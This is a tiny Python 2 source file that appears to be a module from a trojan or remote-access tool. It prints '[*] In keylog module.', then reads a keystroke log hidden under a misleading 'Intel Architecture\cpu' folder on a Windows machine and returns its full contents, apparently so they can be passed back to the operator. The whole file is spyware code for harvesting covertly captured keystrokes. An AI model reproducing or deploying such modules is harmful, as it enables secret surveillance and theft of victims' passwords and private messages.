def run(**args):
  print "[*] In keylog module."
  fp=open("C:\\Intel Architecture\\cpu\\2016-01-21-15-07-34.txt","r")
  words=fp.readlines()
  str=""
  for word in words:
    str+=word
  return str
